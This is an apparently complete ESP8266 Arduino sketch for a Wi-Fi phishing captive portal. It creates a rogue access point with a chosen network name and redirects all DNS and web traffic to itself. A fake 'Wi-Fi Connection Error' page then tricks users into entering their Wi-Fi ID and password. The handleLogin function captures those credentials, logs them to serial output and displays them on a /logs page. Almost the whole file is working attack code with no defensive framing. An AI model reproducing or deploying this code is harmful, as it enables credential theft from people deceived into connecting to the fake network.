#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

ESP8266WebServer server(80);
DNSServer dnsServer;

String storedCredentials = "";

// Wi-Fi Setup
const char* setup_ssid = "Setup_WiFi";
const char* setup_pass = "12345678";
bool wifiCreated = false;

// Fake Wi-Fi Down Page
const char login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Connection Error</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border-radius: 10px; }
    h2 { color: red; }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
    button { background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Wi-Fi Connection Error</h2>
    <p>Your Wi-Fi connection is down. Enter your credentials to restore connectivity.</p>
    <form action="/login" method="POST">
      <input type="text" name="user" placeholder="Wi-Fi ID" required><br>
      <input type="password" name="pass" placeholder="Wi-Fi Password" required><br>
      <button type="submit">Reconnect</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

// Fake Wi-Fi Setup Page
const char wifi_setup_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Setup New Wi-Fi</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); border-radius: 10px; }
    h2 { color: blue; }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
    button { background: blue; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Setup Your Wi-Fi</h2>
    <form action="/setwifi" method="POST">
      <input type="text" name="ssid" placeholder="New Wi-Fi Name" required><br>
      <input type="password" name="pass" placeholder="New Wi-Fi Password"><br>
      <button type="submit">Create Wi-Fi</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

// Logs Page
void handleLogs() {
  String logsPage = "<html><head><title>Captured Logins</title></head><body>";
  logsPage += "<h2>Stored Credentials</h2><pre>" + storedCredentials + "</pre>";
  logsPage += "<a href='/'>Go Back</a></body></html>";
  server.send(200, "text/html", logsPage);
}

// Captive Portal Redirect
void handleRedirect() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

// Serve Root Page
void handleRoot() {
  if (!wifiCreated) {
    server.send(200, "text/html", wifi_setup_html);
  } else {
    server.send(200, "text/html", login_html);
  }
}

// Fake Wi-Fi Creation
void handleSetWiFi() {
  String newSSID = server.arg("ssid");
  String newPassword = server.arg("pass");

  if (newSSID.length() > 0) {
    WiFi.softAPdisconnect(true);
    WiFi.softAP(newSSID.c_str(), newPassword.c_str());
    wifiCreated = true;
    server.send(200, "text/html", "<h2>Wi-Fi Created Successfully!</h2><a href='/'>Go to Login</a>");
  } else {
    server.send(400, "text/html", "<h2>Error: SSID cannot be empty!</h2><a href='/'>Try Again</a>");
  }
}

// Fake Login Handler
void handleLogin() {
  String username = server.arg("user");
  String password = server.arg("pass");

  storedCredentials += "User: " + username + " | Pass: " + password + "<br>";
  Serial.println("[LOG] Captured: " + username + " / " + password);

  server.send(200, "text/html", "<h2>Reconnection Successful</h2><a href='/'>Go Back</a>");
}

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(setup_ssid, setup_pass);

  dnsServer.start(53, "*", WiFi.softAPIP()); // Captive Portal

  server.on("/", handleRoot);
  server.on("/setwifi", HTTP_POST, handleSetWiFi);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logs", handleLogs);
  server.onNotFound(handleRedirect);  // Redirect all unknown URLs

  server.begin();
  Serial.println("[INFO] Fake Wi-Fi Server Started!");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
